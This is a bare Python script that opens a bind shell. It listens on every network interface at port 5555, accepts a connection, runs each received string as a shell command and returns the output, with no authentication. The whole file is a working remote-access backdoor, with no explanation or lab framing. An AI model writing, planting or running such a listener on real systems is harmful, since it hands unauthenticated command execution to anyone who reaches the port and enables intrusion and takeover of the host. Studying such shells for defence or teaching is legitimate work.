#!/usr/bin/env python3
import socket
import subprocess
import os

HOST = '0.0.0.0'
PORT = 5555

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((HOST, PORT))
s.listen(1)

print(f"Listening on {HOST}:{PORT}...")

conn, addr = s.accept()
print(f"Connection from {addr}")

while True:
    data = conn.recv(1024).decode()
    if data.strip() == "exit":
        break
    proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    stdout_value = proc.stdout.read() + proc.stderr.read()
    conn.send(stdout_value)

conn.close()
